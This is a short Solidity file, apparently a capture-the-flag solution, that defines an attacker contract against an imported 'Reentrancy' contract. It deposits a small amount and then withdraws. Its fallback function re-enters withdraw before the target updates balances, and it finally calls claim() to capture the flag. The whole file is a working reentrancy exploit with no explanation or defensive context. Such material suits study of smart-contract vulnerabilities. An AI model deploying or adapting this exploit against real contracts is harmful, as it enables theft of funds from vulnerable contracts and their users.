pragma solidity ^0.5.0;

import "./Reentrancy.sol";

contract MyLittleReentrancy {
    Reentrancy contract_instance;
    bool reentrancy_must_be_done = true;

    constructor(address payable _address) public payable {
                contract_instance = Reentrancy(_address);
    }

    function do_attack() public payable {
        require(msg.value >=  (10 wei));
        contract_instance.deposit.value(4 wei)();
        contract_instance.withdraw(3);
    }
    function withdrawbig(uint256 amount) public {
        contract_instance.withdraw(amount);
        
    }
    function call_flag() public {
        contract_instance.claim();

    }
    function() external payable {
        if (reentrancy_must_be_done) {
            contract_instance.withdraw(3);
            reentrancy_must_be_done = false;
        }
    }
}